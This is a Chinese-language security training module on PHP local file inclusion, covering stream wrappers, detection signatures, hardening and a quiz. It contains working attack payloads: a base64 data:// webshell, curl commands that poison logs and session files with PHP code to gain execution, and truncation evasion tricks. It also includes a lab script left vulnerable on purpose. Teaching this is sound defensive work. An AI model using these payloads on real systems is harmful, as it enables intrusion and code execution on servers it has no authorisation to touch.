# R11.3 本地檔案包含機制與安全防禦分析 (Local File Inclusion Mechanics & Defense)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**本地檔案包含 (Local File Inclusion, LFI)** 發生於動態語言（如 PHP、Node.js）使用使用者可控參數動態載入本地檔案時。其本質為：**「檔案包含並非純文字讀取，而是將目標檔案送入直譯器執行環境（如 Zend Engine）；若檔案中含有語言腳本標籤（如 `<?php ... ?>`），將被直接編譯為指令執行，從而將任意檔案讀取漏洞升級為遠端代碼執行 (RCE)」**。

```
[攻擊者] ── 1. GET /index.php?page=php://filter/... ──► [Web 應用程式]
                                                              │
                                                              ▼ 調用 include($page)
                                                     [語言直譯器 VFS 串流解析]
                                                              │
                   ┌──────────────────────────────────────────┴──────────────────────────────────────────┐
                   ▼ (讀取模式：無腳本標籤)                                                               ▼ (執行模式：含腳本標籤)
        [讀取原始碼 / 設定檔 (Base64)]                                                         [將內容編譯為 Opcode 執行 (RCE)]
                   │                                                                                      │
                   ▼                                                                                      ▼
        [源碼外洩 / 憑證洩漏]                                                                  [日誌投毒 / Session 包含取得 Shell]
```

### 核心作戰決策與邊界
- **常見場景**：模組載入（`?page=about`）、模板引擎渲染、多語言切換（`?lang=en`）。
- **作戰決策心流**：
  1. **原始碼讀取**：使用串流協議 `php://filter/read=convert.base64-encode/resource=...` 繞過直譯執行，提取 PHP 原始碼。
  2. **升級 RCE 打擊**：
     - **日誌投毒 (Log Poisoning)**：在 User-Agent 寫入 WebShell，包含存取日誌 `/var/log/nginx/access.log`。
     - **Session 檔案包含**：在 Cookie 儲存 Payload，包含 `/tmp/sess_PHPSESSID`。
     - **PHPINFO 暫存檔案競爭**：利用檔案上傳在 `/tmp` 產生的隨機臨時檔發起併發包含。
- **技術邊界**：
  - **與路徑遍歷 (R11.2) 差異**：遍歷僅為靜態檔案讀取；包含弱點會將被包含檔案當作程式碼直譯執行。

## 🔬 第一動：底層機制與 PHP 偽協定串流 (Mechanics & Stream Wrappers)

### PHP 核心串流包裝器特性速查表

| 串流協定 | 核心語法範例 | 作用與突防原理 | 必要環境條件 |
| :--- | :--- | :--- | :--- |
| **php://filter** | `php://filter/convert.base64-encode/resource=config.php` | 將原始碼在進入直譯編譯前轉為 Base64 輸出，防禦腳本執行中斷 | 無特殊限制（預設支援） |
| **data://** | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+` | 直接將 Base64 字串解碼為腳本送入直譯器執行 | `allow_url_include = On` |
| **php://input** | `php://input` (POST 傳送 `<?php phpinfo(); ?>`) | 將 HTTP POST Body 內容作為腳本執行 | `allow_url_include = On` |
| **phar://** | `phar:///var/www/uploads/avatar.jpg/shell.php` | 解壓 Phar 歸檔並執行內部腳本，亦可觸發反序列化 | 需要上傳點將 Phar 封裝檔落盤 |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心注入向量速查表

#### 1. 原始碼洩漏向量 (php://filter)
```http
GET /index.php?page=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1
Host: target.internal
```
- 回顯 Base64 字串，解碼後即為後端完整 PHP 程式碼。

#### 2. Apache / Nginx 日誌投毒 RCE (Log Poisoning)
1. **注入載荷**：發送畸形請求將 PHP 代碼寫入日誌：
   ```bash
   curl -s -H "User-Agent: <?php system(\$_GET['c']); ?>" "http://target.internal/"
   ```
2. **包含觸發執行**：
   ```bash
   curl -s "http://target.internal/index.php?page=../../../../var/log/nginx/access.log&c=id"
   ```

#### 3. PHP Session 檔案包含 RCE
1. **設定帶有代碼的 Session 變數**：
   ```bash
   curl -s -H "Cookie: PHPSESSID=attacker123" "http://target.internal/profile.php" -d "username=<?php phpinfo(); ?>"
   ```
2. **包含該 Session 檔案**：
   ```bash
   curl -s "http://target.internal/index.php?page=../../../../tmp/sess_attacker123"
   ```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **後綴硬編碼規避**：
  - 若代碼寫為 `include($_GET['page'] . ".php");`：
  - 在舊版 PHP (< 5.3.4) 中使用 NULL Byte 截斷：`?page=../../etc/passwd%00`。
  - 使用長目錄截斷：重複包含多個 `./` 使路徑長度超過 4096 位元組（Linux MAX_PATH），迫使後綴被丟棄。
- **鑑識特徵**：
  - **日誌特徵**：Web Access Log 中出現 `php://filter`、`php://input`、或路徑中包含 `sess_`、`access.log`。
  - **進程異常**：Web 伺服器進程衍生執行 `id`、`whoami`、`sh` 或反彈連線。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **原始碼讀取** | 存取日誌中出現 `php://filter` 協定特徵 | 禁用動態包含；採用嚴格靜態映射查表 | 尋找未被過濾的次要模組或模板引擎 |
| **日誌投毒 RCE** | 日誌檔中出現 `<?php` 特徵碼；日誌檔案被 Web 讀取 | 日誌目錄權限隔離 (`chmod 640`)，禁止 Web 帳號讀取 | 轉向尋找 `/proc/self/environ` 或 Session 檔案 |
| **Data 協定注入** | 請求參數中出現 `data://` 特徵 | php.ini 強制配置 `allow_url_include = Off` | 利用本地 Phar 封裝檔或 Zip 偽協定執行 |
| **Session 包含** | 請求讀取 `/tmp/sess_*` 檔案特徵 | 自訂 Session 儲存目錄或改用 Redis 儲存 | 透過檔案上傳暫存檔案競爭 (LFI with upload) |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. 程式碼層級：徹底實施「靜態查表白名單 (Allow-list Mapping)」
```php
<?php
// 安全加固：徹底禁止由使用者輸入直接拼接檔案路徑
$allowed_pages = [
    'home'    => 'views/home.php',
    'about'   => 'views/about.php',
    'contact' => 'views/contact.php'
];

$page = $_GET['page'] ?? 'home';

if (array_key_exists($page, $allowed_pages)) {
    include($allowed_pages[$page]);
} else {
    http_response_code(404);
    echo "Page not found";
}
?>
```

### 2. PHP 執行時環境加固 (php.ini 基線)
```ini
; 1. 嚴格禁用遠端檔案包含與 data 串流
allow_url_fopen = Off
allow_url_include = Off

; 2. 限制檔案讀取範圍僅限 Web 目錄，禁止存取 /etc 與 /var/log
open_basedir = "/var/www/html/:/tmp/"
```

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心代碼 (`lfi_lab.php`，極簡 15 行)
```php
<?php
// 脆弱靶場環境 (Port 8113)
$file = $_GET['page'] ?? 'home';

if (isset($_GET['safe'])) {
    // 加固：白名單過濾
    $whitelist = ['home' => 'home.txt', 'about' => 'about.txt'];
    if (array_key_exists($file, $whitelist)) {
        include($whitelist[$file]);
    } else {
        die("Forbidden");
    }
} else {
    // 缺陷：直接包含使用者輸入
    include($file);
}
?>
```

### 2. 三步驗證流程

1. **讀取本機 passwd**：
   ```bash
   curl -s "http://127.0.0.1:8113/lfi_lab.php?page=/etc/passwd"
   # 成功回顯帳號名冊！
   ```
2. **使用 php://filter 讀取源碼**：
   ```bash
   curl -s "http://127.0.0.1:8113/lfi_lab.php?page=php://filter/read=convert.base64-encode/resource=lfi_lab.php"
   # 回顯 Base64 字串，證實源碼洩漏！
   ```
3. **驗證加固端點**：
   ```bash
   curl -s "http://127.0.0.1:8113/lfi_lab.php?safe=1&page=/etc/passwd"
   # 回顯 Forbidden，阻斷成功！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. LFI (本地檔案包含) 與 Path Traversal (路徑遍歷) 的根本差異為何？**  
  *分析思路*：路徑遍歷是純檔案系統讀取；LFI 則透過語言直譯器執行檔案內容，包含有腳本標籤時可直接造成代碼執行 (RCE)。

- [ ] **Q2. 為什麼 `php://filter` 可以讀取 PHP 檔案原始碼而不會被直譯執行？**  
  *分析思路*：`php://filter` 在直譯器詞法分析前先調用 Base64 轉換過濾器，將腳本標籤轉化為純 ASCII 字符，直譯器判定為普通文字直接輸出至回應中。

- [ ] **Q3. 什麼是日誌投毒 (Log Poisoning)？其成立的先決條件為何？**  
  *分析思路*：在 User-Agent 或 URL 中寫入 PHP 代碼，該代碼被寫入 Access Log 中；隨後利用 LFI 包含該日誌檔案，直譯器解析日誌中的 PHP 代碼達成 RCE。必要條件為 Web 帳號具備該日誌檔案的讀取權限。

- [ ] **Q4. `open_basedir` 在防禦 LFI 中扮演何種角色？**  
  *分析思路*：`open_basedir` 在語言底層限制所有檔案操作只能在指定目錄內（如 `/var/www/html`），即使存在 LFI 亦無法跳躍存取 `/etc/passwd` 或 `/var/log`。

- [ ] **Q5. 徹底防範本地檔案包含的唯一黃金實踐是什麼？**  
  *分析思路*：全面廢除以字串動態拼接作為 `include`/`require` 參數的做法，強制使用靜態白名單查表（Allow-list Mapping）分派檔案。
